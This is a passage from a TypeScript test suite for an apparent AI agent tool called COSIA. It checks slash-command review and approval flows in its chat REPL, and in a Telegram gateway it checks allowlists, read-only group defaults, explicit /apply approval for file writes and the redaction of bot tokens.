    }], session, "run-review", "cosia-agent");
    const [skillCandidate] = new SkillManager(root).appendCandidates([{
      agentId: "cosia-agent",
      skillName: "Review Command Skill",
      reason: "Exercise review commands.",
      content: "Use this skill to test review command preview.",
      triggers: ["review command"]
    }], session, "run-review", "cosia-agent");
    const input = new PassThrough();
    const output = captureWritable();
    const errorOutput = captureWritable();

    const resultPromise = runChatRepl({
      workspaceRoot: root,
      sessionId: session.id,
      providerId: "mock",
      input,
      output: output.stream,
      errorOutput: errorOutput.stream
    });
    const feedInput = async () => {
      for (const line of [
        "/review",
        "/review memory",
        "/review skill",
        "/review show 1",
        `/review show ${skillCandidate.id.slice(0, 8)}`,
        `/review conflicts ${memoryCandidate.id.slice(0, 8)}`,
        `/review conflicts ${skillCandidate.id.slice(0, 8)}`,
        `/review promote ${memoryCandidate.id.slice(0, 8)}`,
        `/review promote ${memoryCandidate.id.slice(0, 8)} --replace 1`,
        `/review promote ${skillCandidate.id.slice(0, 8)}`,
        `/review discard ${skillCandidate.id.slice(0, 8)} --reason "not useful"`,
        `/review discard-conflicts --reason "bulk cleanup"`,
        "/review next",
        "/exit"
      ]) {
        input.write(`${line}\n`);
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      input.end();
    };
    await feedInput();
    const result = await resultPromise;

    expect(result).toMatchObject({ turns: 0, endedBy: "exit" });
    const text = output.read();
    expect(text).toContain("Review Inbox");
    expect(text).toContain("Skill candidates do not have memory conflicts.");
    expect(text).toContain("--replace 1");
    expect(text).toContain("Memory candidate conflicts detected");
    expect(text).toContain("Promoted memory candidate");
    expect(text).toContain("Skill file:");
    expect(text).toContain("Discarded skill candidate");
    expect(text).toContain("Tip: indexes are temporary");
    expect((await new MemoryManager(root).getCandidate(memoryCandidate.id)).record?.status).toBe("promoted");
    expect(new SkillManager(root).getCandidate(skillCandidate.id).record.status).toBe("discarded");
  });

  it("keeps pending approval explicit through slash commands after hash shortcuts are removed", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Slash pending REPL test");
    const input = new PassThrough();
    const output = captureWritable();
    const errorOutput = captureWritable();
    let fakeNow = Date.parse("2026-05-20T00:00:00.000Z");

    const resultPromise = runChatRepl({
      workspaceRoot: root,
      sessionId: session.id,
      providerId: "mock",
      input,
      output: output.stream,
      errorOutput: errorOutput.stream,
      now: () => fakeNow
    });
    const waitForOutput = async (needle: string) => {
      for (let attempt = 0; attempt < 100; attempt += 1) {
        if (output.read().includes(needle)) {
          return;
        }
        await new Promise((resolve) => setTimeout(resolve, 1));
      }
      throw new Error(`Timed out waiting for output: ${needle}`);
    };
    const waitForOutputCount = async (needle: string, count: number) => {
      for (let attempt = 0; attempt < 100; attempt += 1) {
        const matches = output.read().split(needle).length - 1;
        if (matches >= count) {
          return;
        }
        await new Promise((resolve) => setTimeout(resolve, 1));
      }
      throw new Error(`Timed out waiting for ${count} outputs: ${needle}`);
    };
    const feedInput = async () => {
      for (const line of [
        "#리뷰 보여줘",
        "/status",
        "/review",
        "/shell echo ready",
        "/pending",
        "/cancel",
        "/shell echo ready"
      ]) {
        input.write(`${line}\n`);
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      await waitForOutput("Shell approval cancelled");
      await waitForOutputCount("Run /apply to execute once", 2);
      fakeNow += 5 * 60 * 1000 + 1;
      input.write("/apply\n");
      await waitForOutput("[EXPIRED]");
      for (const line of [
        "/shell echo ready",
        "/apply",
        "/exit"
      ]) {
        input.write(`${line}\n`);
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      input.end();
    };
    await feedInput();
    const result = await resultPromise;

    expect(result).toMatchObject({ turns: 0, endedBy: "exit" });
    const text = output.read();
    expect(text).toContain("Review Inbox");
    expect(text).toContain("Hash command shortcuts were removed.");
    expect(text).toContain("[PREVIEW]");
    expect(text).toContain("Pending command: shell.apply");
    expect(text).toContain("[EXPIRED]");
    expect(text).toContain("[SUCCESS] Shell command executed once.");
    expect(formatChatHelp()).not.toContain("Natural commands");
    expect(formatChatHelp()).toContain("# command shortcuts were removed.");
  });

  it("prints MVP acceptance checklist and documents expected outcomes", async () => {
    const checklist = formatMvpChecklist();
    expect(checklist).toContain("COSIA MVP Acceptance Checklist");
    expect(checklist).toContain("[ ] 1. Environment and build");
    expect(checklist).toContain("mock: regression only");
    expect(checklist).toContain("openai-codex: first-class OpenAI Codex OAuth provider profile");
    expect(checklist).toContain("[ ] 8. Review inbox");
    expect(checklist).toContain("Command:");
    expect(checklist).toContain("Expected:");

    const acceptance = await readFile(join(process.cwd(), "MVP_ACCEPTANCE.md"), "utf8");
    expect(acceptance).toContain("codex-cli");
    expect(acceptance).toContain("mock");
    expect(acceptance).toContain("Review Inbox");
    expect((acceptance.match(/Expected Outcome:/g) ?? []).length).toBeGreaterThanOrEqual(11);
  });

  it("repairs Telegram connector policy defaults and checks disabled/missing states", async () => {
    const root = await initializedWorkspace();
    const policy = await new PolicyManager(root).loadPolicy();
    expect(policy.connectors.telegram).toMatchObject({
      enabled: false,
      tokenEnv: "TELEGRAM_BOT_TOKEN",
      allowedChatIds: [],
      allowedUserIds: [],
      mutationUserIds: [],
      groupMode: "read_only"
    });

    expect(await checkTelegramGateway(root)).toMatchObject({
      ok: false,
      reason: "disabled"
    });

    await writeRuntimeLocal(root, {
      connectors: {
        telegram: {
          ...policy.connectors.telegram,
          enabled: true
        }
      }
    });
    expect(await checkTelegramGateway(root)).toMatchObject({
      ok: false,
      reason: "missing_allowed_chat_ids"
    });

    const enabledPolicy = await new PolicyManager(root).loadPolicy();
    await writeRuntimeLocal(root, {
      connectors: {
        telegram: {
          ...enabledPolicy.connectors.telegram,
          enabled: true,
          allowedChatIds: ["123"]
        }
      }
    });

    const previousToken = process.env.TELEGRAM_BOT_TOKEN;
    process.env.TELEGRAM_BOT_TOKEN = "bad-token";
    try {
      expect(await checkTelegramGateway(root, {
        fetchImpl: async () => jsonResponse({
          ok: false,
          error_code: 404,
          description: "Not Found"
        }, 404)
      })).toMatchObject({
        ok: false,
        reason: "auth_failed"
      });
    } finally {
      if (previousToken === undefined) {
        delete process.env.TELEGRAM_BOT_TOKEN;
      } else {
        process.env.TELEGRAM_BOT_TOKEN = previousToken;
      }
    }
  });

  it("configures Telegram through private connector settings and never prints token values", async () => {
    const root = await initializedWorkspace();
    await enableTelegramConnector(root, true);
    await addTelegramChatId(root, "123");
    await addTelegramUserId(root, "42");
    await addTelegramMutationUserId(root, "42");
    await setTelegramGroupMode(root, "allowed_users");
    await setTelegramToken(root, "1234567890:AAsecrettelegramtokenvalue");

    const policy = await new PolicyManager(root).loadPolicy();
    expect(policy.connectors.telegram.enabled).toBe(true);
    expect(policy.connectors.telegram.allowedChatIds).toEqual(["123"]);
    expect(policy.connectors.telegram.allowedUserIds).toEqual(["42"]);
    expect(policy.connectors.telegram.mutationUserIds).toEqual(["42"]);
    expect(policy.connectors.telegram.groupMode).toBe("allowed_users");
    expect(JSON.stringify(policy.connectors.telegram)).not.toContain("secrettelegram");
    expect(await readFile(runtimePrivatePath(root), "utf8")).not.toContain("secrettelegram");
    expect(await readFile(secretsPrivatePath(root), "utf8")).toContain("secrettelegram");

    const check = await checkTelegramGateway(root, {
      fetchImpl: async () => jsonResponse({ ok: true, result: { id: 1, username: "cosia_test_bot" } })
    });
    expect(check).toMatchObject({
      ok: true,
      tokenStatus: "configured via private secret",
      allowedUserIds: 1,
      mutationUserIds: 1,
      groupMode: "allowed_users"
    });
    expect(formatTelegramCheck(check)).not.toContain("secrettelegram");
    expect(formatTelegramCheck(check)).toContain("Group mode: allowed_users");

    await removeTelegramUserId(root, "42");
    await removeTelegramMutationUserId(root, "42");
    const updated = await new PolicyManager(root).loadPolicy();
    expect(updated.connectors.telegram.allowedUserIds).toEqual([]);
    expect(updated.connectors.telegram.mutationUserIds).toEqual([]);
  });

  it("processes Telegram updates with allowlist checks, state, chunks, and slash commands", async () => {
    const root = await initializedWorkspace();
    const policyManager = new PolicyManager(root);
    const policy = await policyManager.loadPolicy();
    const gatewayPolicy = {
      ...policy,
      connectors: {
        telegram: {
          ...policy.connectors.telegram,
          enabled: true,
          allowedChatIds: ["123"],
          allowedUserIds: ["42"],
          defaultProvider: "mock",
          messageChunkChars: 120
        }
      }
    };
    const sent: Array<{ chatId: string; text: string; options?: { replyMarkup?: unknown } }> = [];
    const sender = {
      sendMessage: async (chatId: string, text: string, options?: { replyMarkup?: unknown }) => {
        sent.push({ chatId, text, options });
      }
    };
    let state = await processTelegramUpdate(root, gatewayPolicy, sender, {
      chats: {},
      failureCount: 0,
      updatedAt: new Date().toISOString()
    }, {
      update_id: 1,
      message: {
        chat: { id: 999 },
        text: "/status"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    expect(sent.at(-1)?.text).toContain("Unauthorized");
    expect(state.chats["999"]).toBeUndefined();

    const sentBeforeOwnerGate = sent.length;
    state = await processTelegramUpdate(root, gatewayPolicy, sender, state, {
      update_id: 2,
      message: {
        chat: { id: 123 },
        from: { id: 7, username: "guest" },
        text: "/status"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    const ownerGateOutput = sent.slice(sentBeforeOwnerGate).map((message) => message.text).join("\n");
    expect(ownerGateOutput).toContain("Telegram slash command owner gate");
    expect(ownerGateOutput).toContain("cosia gateway telegram set user-id 7");
    expect(state.chats["123"]?.activeSessionId).toBeUndefined();
    expect(state.chats["123"]?.pendingCommand).toBeUndefined();

    state = await processTelegramUpdate(root, gatewayPolicy, sender, state, {
      update_id: 3,
      message: {
        chat: { id: 123 },
        from: { id: 42, username: "fox" },
        text: "/status"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    expect(state.chats["123"]).toBeDefined();
    expect(sent.some((message) => message.chatId === "123" && message.text.includes("COSIA"))).toBe(true);

    const sentBeforeBatch = sent.length;
    state = await processTelegramUpdate(root, gatewayPolicy, sender, state, {
      update_id: 4,
      message: {
        chat: { id: 123 },
        from: { id: 42, username: "fox" },
        text: "/help\n/sessions\n/status"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    const batchMessages = sent.slice(sentBeforeBatch).map((message) => message.text).join("\n");
    expect(batchMessages).toContain("COSIA Telegram Gateway commands");
    expect(batchMessages).toContain("No sessions. Use /new <goal>.");
    expect(batchMessages).toContain("COSIA");

    const chunks = chunkTelegramMessage(`one\n\n${"x".repeat(80)}\n${"y".repeat(80)}`, 90);
    expect(chunks.length).toBeGreaterThan(1);
    expect(chunks[1]).toContain("[continued 2/");
  });

  it("enqueues Telegram session runs and keeps job status commands responsive", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Async gateway job");
    const policy = await new PolicyManager(root).loadPolicy();
    const gatewayPolicy = {
      ...policy,
      connectors: {
        telegram: {
          ...policy.connectors.telegram,
          enabled: true,
          allowedChatIds: ["123"],
          allowedUserIds: ["42"],
          defaultProvider: "mock"
        }
      }
    };
    const sent: Array<{ chatId: string; text: string }> = [];
    const sender = {
      sendMessage: async (chatId: string, text: string) => {
        sent.push({ chatId, text });
      }
    };
    let state = await processTelegramUpdate(root, gatewayPolicy, sender, {
      chats: {
        "123": {
          providerId: "mock",
          activeSessionId: session.id
        }
      },
      failureCount: 0,
      updatedAt: new Date().toISOString()
    }, {
      update_id: 1,
      message: {
        chat: { id: 123 },
        from: { id: 42, username: "fox" },
        text: "[MOCK_SLOW_FINAL] hello"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    expect(sent.at(-1)?.text).toContain("작업을 시작했어.");
    const jobId = sent.at(-1)?.text.match(/Job: (job_[a-f0-9]+)/)?.[1];
    expect(jobId).toBeTruthy();

    state = await processTelegramUpdate(root, gatewayPolicy, sender, state, {
      update_id: 2,
      message: {
        chat: { id: 123 },
        from: { id: 42, username: "fox" },
        text: "/jobs"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    expect(sent.at(-1)?.text).toContain(jobId);

    await waitForCondition(() => sent.some((message) => message.text.includes(`Mock response for ${session.id}.`)));
    const job = await new RunJobLedger(root).get(jobId!);
    expect(job?.status).toBe("succeeded");
  });

  it("keeps Telegram groups read-only by default and requires user-level mutation authorization", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Group safety");
    const stylePath = join(root, "agents", "cosia-agent", "STYLE.md");
    const originalStyle = await readFile(stylePath, "utf8");
    const policy = await new PolicyManager(root).loadPolicy();
    const readOnlyGroupPolicy = {
      ...policy,
      connectors: {
        telegram: {
          ...policy.connectors.telegram,
          enabled: true,
          allowedChatIds: ["-100"],
          allowedUserIds: ["42"],
          allowMutations: true,
          groupMode: "read_only" as const,
          defaultProvider: "mock"
        }
      }
    };
    const sent: Array<{ chatId: string; text: string }> = [];
    const sender = {
      sendMessage: async (chatId: string, text: string) => {
        sent.push({ chatId, text });
      }
    };

    let state = await processTelegramUpdate(root, readOnlyGroupPolicy, sender, {
      chats: {},
      failureCount: 0,
      updatedAt: new Date().toISOString()
    }, {
      update_id: 1,
      message: {
        chat: { id: -200, type: "group" },
        from: { id: 42, username: "fox", first_name: "Fox" },
        text: "/whoami"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    expect(sent.at(-1)?.text).toContain("Chat id: -200");
    expect(sent.at(-1)?.text).toContain("User id: 42");
    expect(sent.at(-1)?.text).toContain("cosia gateway telegram set mutation-user-id 42");
    expect(state.chats["-200"]).toBeUndefined();

    state = await processTelegramUpdate(root, readOnlyGroupPolicy, sender, state, {
      update_id: 2,
      message: {
        chat: { id: -100, type: "group" },
        from: { id: 42, username: "fox" },
        text: "/status"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    expect(sent.at(-1)?.text).toContain("COSIA 0.52.0");

    state = await processTelegramUpdate(root, readOnlyGroupPolicy, sender, {
      ...state,
      chats: {
        "-100": {
          providerId: "mock",
          activeSessionId: session.id
        }
      }
    }, {
      update_id: 3,
      message: {
        chat: { id: -100, type: "group" },
        from: { id: 42, username: "fox" },
        text: "그냥 대화해줘"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    expect(sent.at(-1)?.text).toContain("Telegram group chats are read-only by default");

    state = await processTelegramUpdate(root, readOnlyGroupPolicy, sender, {
      ...state,
      chats: {
        "-100": {
          providerId: "mock",
          activeSessionId: session.id,
          pendingCommand: {
            id: "pending_group",
            commandId: "write_file.overwrite",
            args: {},
            safety: "mutation",
            createdAt: new Date().toISOString(),
            expiresAt: new Date(Date.now() + 300000).toISOString(),
            createdAtMs: Date.now(),
            expiresAtMs: Date.now() + 300000,
            preview: "preview"
          }
        }
      }
    }, {
      update_id: 4,
      message: {
        chat: { id: -100, type: "group" },
        from: { id: 42, username: "fox" },
        text: "/apply"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    expect(sent.at(-1)?.text).toContain("Telegram group chats are read-only by default");

    const allowedGroupPolicy = {
      ...policy,
      connectors: {
        telegram: {
          ...policy.connectors.telegram,
          enabled: true,
          allowedChatIds: ["-100"],
          allowedUserIds: ["42"],
          mutationUserIds: [],
          allowMutations: true,
          groupMode: "allowed_users" as const,
          defaultProvider: "mock"
        }
      }
    };
    state = await processTelegramUpdate(root, allowedGroupPolicy, sender, {
      chats: {
        "-100": {
          providerId: "mock",
          activeSessionId: session.id
        }
      },
      failureCount: 0,
      updatedAt: new Date().toISOString()
    }, {
      update_id: 5,
      message: {
        chat: { id: -100, type: "group" },
        from: { id: 42, username: "fox" },
        text: "[MOCK_WRITE_ONLY:agents/cosia-agent/STYLE.md]"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    expect(sent.at(-1)?.text).toContain("작업을 시작했어.");
    await waitForCondition(() => sent.some((message) => message.text.includes("[PREVIEW] File overwrite requires approval.")));
    state = await loadTelegramGatewayState(root);
    expect(await readFile(stylePath, "utf8")).toBe(originalStyle);

    state = await processTelegramUpdate(root, allowedGroupPolicy, sender, state, {
      update_id: 6,
      message: {
        chat: { id: -100, type: "group" },
        from: { id: 42, username: "fox" },
        text: "/apply"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    expect(sent.at(-1)?.text).toContain("not allowed to approve mutations");
    expect(await readFile(stylePath, "utf8")).toBe(originalStyle);

    state = await processTelegramUpdate(root, {
      ...allowedGroupPolicy,
      connectors: {
        telegram: {
          ...allowedGroupPolicy.connectors.telegram,
          mutationUserIds: ["42"]
        }
      }
    }, sender, state, {
      update_id: 7,
      message: {
        chat: { id: -100, type: "group" },
        text: "/apply"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    expect(sent.at(-1)?.text).toContain("did not provide a sender user id");
    expect(await readFile(stylePath, "utf8")).toBe(originalStyle);

    const mutationGroupPolicy = {
      ...allowedGroupPolicy,
      connectors: {
        telegram: {
          ...allowedGroupPolicy.connectors.telegram,
          mutationUserIds: ["42"]
        }
      }
    };
    state = await processTelegramUpdate(root, mutationGroupPolicy, sender, state, {
      update_id: 8,
      message: {
        chat: { id: -100, type: "group" },
        from: { id: 42, username: "fox" },
        text: "/apply"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    expect(sent.at(-1)?.text).toContain("[SUCCESS] File overwrite applied.");
    expect(await readFile(stylePath, "utf8")).toBe("mock write");
  });

  it("clears missing active Telegram sessions and guides the user to create or select a session", async () => {
    const root = await initializedWorkspace();
    const policyManager = new PolicyManager(root);
    const policy = await policyManager.loadPolicy();
    const gatewayPolicy = {
      ...policy,
      connectors: {
        telegram: {
          ...policy.connectors.telegram,
          enabled: true,
          allowedChatIds: ["123"],
          allowedUserIds: ["42"],
          defaultProvider: "mock"
        }
      }
    };
    const sent: Array<{ chatId: string; text: string }> = [];
    const sender = {
      sendMessage: async (chatId: string, text: string) => {
        sent.push({ chatId, text });
      }
    };

    const state = await processTelegramUpdate(root, gatewayPolicy, sender, {
      chats: {
        "123": {
          providerId: "mock",
          activeSessionId: "session_missing"
        }
      },
      failureCount: 0,
      updatedAt: new Date().toISOString()
    }, {
      update_id: 1,
      message: {
        chat: { id: 123 },
        text: "hello"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });

    expect(state.chats["123"]?.activeSessionId).toBeUndefined();
    expect(sent.at(-1)?.text).toContain("no longer exists");
    expect(sent.at(-1)?.text).toContain("/new <goal>");
  });

  it("routes plain gateway status questions through the model and rejects hash shortcuts", async () => {
    const root = await initializedWorkspace();
    const policyManager = new PolicyManager(root);
    const policy = await policyManager.loadPolicy();
    const gatewayPolicy = {
      ...policy,
      connectors: {
        telegram: {
          ...policy.connectors.telegram,
          enabled: true,
          allowedChatIds: ["123"],
          allowedUserIds: ["42"],
          defaultProvider: "mock"
        }
      }
    };
    const sent: Array<{ chatId: string; text: string }> = [];
    const sender = {
      sendMessage: async (chatId: string, text: string) => {
        sent.push({ chatId, text });
      }
    };

    const state = await processTelegramUpdate(root, gatewayPolicy, sender, {
      chats: {},
      failureCount: 0,
      updatedAt: new Date().toISOString()
    }, {
      update_id: 1,
      message: {
        chat: { id: 123 },
        text: "지금 게이트웨이 살아 있어?"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });

    expect(sent.at(-1)?.text).toContain("No active session");
    expect(sent.at(-1)?.text).toContain("/new <goal>");
    expect(state.chats["123"]?.activeSessionId).toBeUndefined();

    await processTelegramUpdate(root, gatewayPolicy, sender, state, {
      update_id: 2,
      message: {
        chat: { id: 123 },
        text: "#리뷰 보여줘"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });

    expect(sent.at(-1)?.text).toContain("Hash command shortcuts were removed.");
    expect(sent.at(-1)?.text).toContain("/review");

    await processTelegramUpdate(root, gatewayPolicy, sender, state, {
      update_id: 3,
      message: {
        chat: { id: 123 },
        from: { id: 42, username: "fox" },
        text: "/status"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });

    expect(sent.at(-1)?.text).toContain("COSIA 0.52.0");
    expect(sent.at(-1)?.text).toContain("continuity:sessions");
  });

  it("handles Telegram tool growth follow-up commands with slash syntax", async () => {
    const root = await initializedWorkspace();
    const policy = await new PolicyManager(root).loadPolicy();
    const gatewayPolicy = {
      ...policy,
      connectors: {
        telegram: {
          ...policy.connectors.telegram,
          enabled: true,
          allowedChatIds: ["123"],
          allowedUserIds: ["42"],
          defaultProvider: "mock"
        }
      }
    };
    const sent: Array<{ chatId: string; text: string }> = [];
    const sender = {
      sendMessage: async (chatId: string, text: string) => {
        sent.push({ chatId, text });
      }
    };

    let state = await processTelegramUpdate(root, gatewayPolicy, sender, {
      chats: {},
      failureCount: 0,
      updatedAt: new Date().toISOString()
    }, {
      update_id: 1,
      message: {
        chat: { id: 123 },
        from: { id: 42, username: "fox" },
        text: "/tool grow provider settings inspector"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });

    const routineId = state.chats["123"]?.currentToolGrowthRoutineId;
    expect(routineId).toMatch(/^grow_/);
    expect(sent.at(-1)?.text).toContain(`Tool growth routine created: ${routineId}`);
    expect(sent.at(-1)?.text).toContain(`/tool grow test ${routineId} --yes`);
    expect(sent.at(-1)?.text).not.toContain("cosia tool grow test");

    state = await processTelegramUpdate(root, gatewayPolicy, sender, state, {
      update_id: 2,
      message: {
        chat: { id: 123 },
        from: { id: 42, username: "fox" },
        text: "/tool grow test --yes"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });

    expect(sent.at(-1)?.text).toContain("Tool candidate test passed.");
    expect(sent.at(-1)?.text).toContain(`/tool grow activate ${routineId} --agent <agent-id> --yes`);
    expect(state.chats["123"]?.currentToolGrowthRoutineId).toBe(routineId);

    await processTelegramUpdate(root, gatewayPolicy, sender, state, {
      update_id: 3,
      message: {
        chat: { id: 123 },
        text: `cosia tool grow test ${routineId} --yes`
      }
    }, {
      providerId: "mock",
      owner: "test"
    });

    expect(sent.at(-1)?.text).toContain("Telegram does not execute local CLI commands.");
    expect(sent.at(-1)?.text).toContain(`/tool grow test ${routineId} --yes`);
  });

  it("starts pending tool growth request from natural-language approval in Telegram", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Pending tool growth approval");
    const policy = await new PolicyManager(root).loadPolicy();
    const gatewayPolicy = {
      ...policy,
      connectors: {
        telegram: {
          ...policy.connectors.telegram,
          enabled: true,
          allowedChatIds: ["123"],
          allowedUserIds: ["42"],
          defaultProvider: "mock"
        }
      }
    };
    const sent: Array<{ chatId: string; text: string }> = [];
    const sender = {
      sendMessage: async (chatId: string, text: string) => {
        sent.push({ chatId, text });
      }
    };
    let state = await processTelegramUpdate(root, gatewayPolicy, sender, {
      chats: {
        "123": {
          activeSessionId: session.id,
          providerId: "mock"
        }
      },
      failureCount: 0,
      updatedAt: new Date().toISOString()
    }, {
      update_id: 1,
      message: {
        chat: { id: 123 },
        from: { id: 42, username: "fox" },
        text: "[MOCK_TOOL_GROWTH_REQUEST] 메모리 승격 대상이 있는지 확인해볼래?"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });

    expect(sent.at(-1)?.text).toContain("작업을 시작했어.");
    await waitForCondition(() => sent.some((message) => message.text.includes("Should I start the tool creation routine?")));
    state = await loadTelegramGatewayState(root);
    expect(state.chats["123"]?.pendingToolGrowthRequest?.capabilityName).toBe("memory_promotion_queue_read");
    expect(state.chats["123"]?.currentToolGrowthRoutineId).toBeUndefined();

    state = await processTelegramUpdate(root, gatewayPolicy, sender, state, {
      update_id: 2,
      message: {
        chat: { id: 123 },
        from: { id: 42, username: "fox" },
        text: "ㅇㅇ 시작해"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });

    await waitForCondition(() => sent.some((message) => message.text.includes("Tool growth routine created:")));
    state = await loadTelegramGatewayState(root);
    const routineId = state.chats["123"]?.currentToolGrowthRoutineId;
    expect(routineId).toMatch(/^grow_/);
    expect(state.chats["123"]?.pendingToolGrowthRequest).toBeUndefined();
    expect(sent.at(-1)?.text).toContain("좋아. 방금 제안한 도구 생성 루틴을 시작할게.");
    expect(sent.at(-1)?.text).toContain(`Tool growth routine created: ${routineId}`);
    expect(sent.at(-1)?.text).toContain("read-only memory promotion queue inspector");
  });

  it("turns Telegram write_file overwrite denials into explicit pending apply previews", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Style update approval");
    const stylePath = join(root, "agents", "cosia-agent", "STYLE.md");
    const originalStyle = await readFile(stylePath, "utf8");
    const policyManager = new PolicyManager(root);
    const policy = await policyManager.loadPolicy();
    const gatewayPolicy = {
      ...policy,
      connectors: {
        telegram: {
          ...policy.connectors.telegram,
          enabled: true,
          allowedChatIds: ["123"],
          allowedUserIds: ["42"],
          allowMutations: true,
          defaultProvider: "mock"
        }
      }
    };
    const sent: Array<{ chatId: string; text: string }> = [];
    const sender = {
      sendMessage: async (chatId: string, text: string) => {
        sent.push({ chatId, text });
      }
    };

    let state = await processTelegramUpdate(root, gatewayPolicy, sender, {
      chats: {
        "123": {
          providerId: "mock",
          activeSessionId: session.id
        }
      },
      failureCount: 0,
      updatedAt: new Date().toISOString()
    }, {
      update_id: 1,
      message: {
        chat: { id: 123 },
        text: "[MOCK_WRITE_ONLY:agents/cosia-agent/STYLE.md]"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });

    expect(sent.at(-1)?.text).toContain("작업을 시작했어.");
    await waitForCondition(() => sent.some((message) => message.text.includes("[PREVIEW] File overwrite requires approval.")));
    state = await loadTelegramGatewayState(root);
    expect(sent.at(-1)?.text).toContain("[PREVIEW] File overwrite requires approval.");
    expect(sent.at(-1)?.text).toContain("/apply");
    expect(state.chats["123"]?.pendingCommand?.commandId).toBe("write_file.overwrite");
    expect(await readFile(stylePath, "utf8")).toBe(originalStyle);

    state = await processTelegramUpdate(root, gatewayPolicy, sender, state, {
      update_id: 2,
      message: {
        chat: { id: 123 },
        text: "승인할게 변경해"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    expect(sent.at(-1)?.text).toContain("대화 문장만으로는 파일 변경을 적용하지 않습니다");
    expect(sent.at(-1)?.text).toContain("/apply");
    expect(await readFile(stylePath, "utf8")).toBe(originalStyle);

    state = await processTelegramUpdate(root, gatewayPolicy, sender, state, {
      update_id: 3,
      message: {
        chat: { id: 123 },
        from: { id: 42, username: "fox" },
        text: "/apply"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    expect(sent.at(-1)?.text).toContain("[SUCCESS] File overwrite applied.");
    expect(state.chats["123"]?.pendingCommand).toBeUndefined();
    expect(await readFile(stylePath, "utf8")).toBe("mock write");
  });

  it("routes Telegram protected Codex writes through amendment pending apply previews", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Codex amendment approval");
    const rulesPath = join(root, "codex", "RULES.md");
    const originalRules = await readFile(rulesPath, "utf8");
    const policyManager = new PolicyManager(root);
    const policy = await policyManager.loadPolicy();
    const gatewayPolicy = {
      ...policy,
      connectors: {
        telegram: {
          ...policy.connectors.telegram,
          enabled: true,
          allowedChatIds: ["123"],
          allowedUserIds: ["42"],
          allowMutations: true,
          defaultProvider: "mock"
        }
      }
    };
    const sent: Array<{ chatId: string; text: string }> = [];
    const sender = {
      sendMessage: async (chatId: string, text: string) => {
        sent.push({ chatId, text });
      }
    };

    let state = await processTelegramUpdate(root, gatewayPolicy, sender, {
      chats: {
        "123": {
          providerId: "mock",
          activeSessionId: session.id
        }
      },
      failureCount: 0,
      updatedAt: new Date().toISOString()
    }, {
      update_id: 1,
      message: {
        chat: { id: 123 },
        text: "[MOCK_WRITE_ONLY:codex/RULES.md]"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });

    expect(sent.at(-1)?.text).toContain("작업을 시작했어.");
    await waitForCondition(() => sent.some((message) => message.text.includes("[PREVIEW] Codex amendment requires approval.")));
    state = await loadTelegramGatewayState(root);
    expect(sent.at(-1)?.text).toContain("[PREVIEW] Codex amendment requires approval.");
    expect(sent.at(-1)?.text).toContain("/apply");
    expect(state.chats["123"]?.pendingCommand?.commandId).toBe("codex.amendment.apply");
    expect(await readFile(rulesPath, "utf8")).toBe(originalRules);

    state = await processTelegramUpdate(root, gatewayPolicy, sender, state, {
      update_id: 2,
      message: {
        chat: { id: 123 },
        text: "승인할게 변경해"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    expect(sent.at(-1)?.text).toContain("대화 문장만으로는 파일 변경을 적용하지 않습니다");
    expect(await readFile(rulesPath, "utf8")).toBe(originalRules);

    state = await processTelegramUpdate(root, gatewayPolicy, sender, state, {
      update_id: 3,
      message: {
        chat: { id: 123 },
        from: { id: 42, username: "fox" },
        text: "/apply"
      }
    }, {
      providerId: "mock",
      owner: "test"
    });
    expect(sent.at(-1)?.text).toContain("[SUCCESS] Codex amendment applied.");
    expect(state.chats["123"]?.pendingCommand).toBeUndefined();
    expect(await readFile(rulesPath, "utf8")).toBe("mock write");
  });

  it("sends deterministic Telegram fallback when final provider response times out after a tool result", async () => {
    const root = await initializedWorkspace();
    const sessions = new SessionManager(root);
    const session = await sessions.createSession("cosia-agent", "Fallback summary");
    const policy = await new PolicyManager(root).loadPolicy();
    const gatewayPolicy = {
      ...policy,
      connectors: {
        telegram: {
          ...policy.connectors.telegram,
          enabled: true,
          allowedChatIds: ["123"],
          allowedUserIds: ["42"],
          defaultProvider: "mock"
        }
      }
    };
    const sent: Array<{ chatId: string; text: string }> = [];
    const sender = {
      sendMessage: async (chatId: string, text: string) => {
        sent.push({ chatId, text });
      }
    };
    await processTelegramUpdate(root, gatewayPolicy, sender, {
      chats: {
        "123": {
          providerId: "mock",
          activeSessionId: session.id
        }
      },
      failureCount: 0,
      updatedAt: new Date().toISOString()
    }, {
